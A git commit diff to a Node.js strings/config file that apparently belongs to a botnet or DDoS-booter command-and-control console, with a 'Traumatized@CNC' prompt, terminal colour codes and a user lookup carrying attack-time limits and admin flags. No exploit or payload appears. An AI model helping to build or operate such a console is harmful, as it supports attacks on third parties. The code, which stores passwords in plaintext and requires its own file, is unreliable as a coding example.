03b1ec5fbfc822ea867d53b83a423564aef93aa1
Devious <74839733+DeviousTheDev@users.noreply.github.com>
2021-01-19 14:11:55 -0500

    Update strings.js

--- config/strings.js
+++ config/strings.js
@@ -1,26 +1,28 @@
 const fs = require("fs");
-const crud = require("./auth/crud.js");
+const crud = require("../auth/crud.js");
+const config = require("../config/strings.js");
 
 exports.hostname = function(name) {
     if(!name) {
         name = "CNC";
     }
-    return "\x1b[33m[Traumatized@" + name + "]#~ ";
+    return "\x1b[95m[\x1b[33mTraumatized\x1b[95m@\x1b[33m" + name + "\x1b[95m]\x1b[33m#~ \x1b[95m";
 }
 
 exports.Colors = {
     "Red": "\x1b[31m",
     "Yellow": "\x1b[33m",
     "Blue": "\x1b[34m",
-    "Purple": "\x1b[35m",
+    "Purple": "\x1b[95m",
     "Green": "\x1b[32m",
     "Cyan": "\x1b[96m",
     "Black": "\x1b[30m",
     "Grey": "\x1b[90m",
     "Reset": "\x1b[39m",
-    "Clear": "\033[2J\033[1;1H",
-    "Moving_text": "\e[5mBlink",
-    "movingtext2": "\x1b[5mBlink"
+    "Background_Red": "\x1b[41m",
+    "Background_Grey": "\x1b[100m",
+    "Background_Reset": "\x1b[49m",
+    "Clear": "\033[2J\033[1;1H"
 }
 
 exports.CNC_Info = {
@@ -42,9 +44,28 @@ exports.CurrentUser = {
     "Password": "",
     "Level": "",
     "Maxtime": "",
-    "isAdmin": ""
+    "isAdmin": false
 }
 
-exports.GetCurrentUser = function() {
-    
+exports.GetCurrentUser = function(ip) {
+    let get_user = crud.user(ip, "all");
+    let info = get_user.split(",");
+    config.CurrentUser.username = info[0];
+    config.CurrentUser.IP = info[1];
+    config.CurrentUser.password = info[2];
+    config.CurrentUser.Level = info[3];
+    config.CurrentUser.Maxtime = info[4];
+    switch(info[5]) {
+        case "0":
+            config.CurrentUser.isAdmin = false;
+            break;
+        case 0:
+            config.CurrentUser.isAdmin = false;
+            break;
+        case "1":
+            config.CurrentUser.isAdmin = true;
+            break;
+        case 1:
+            config.CurrentUser.isAdmin = true;
+    }
 }
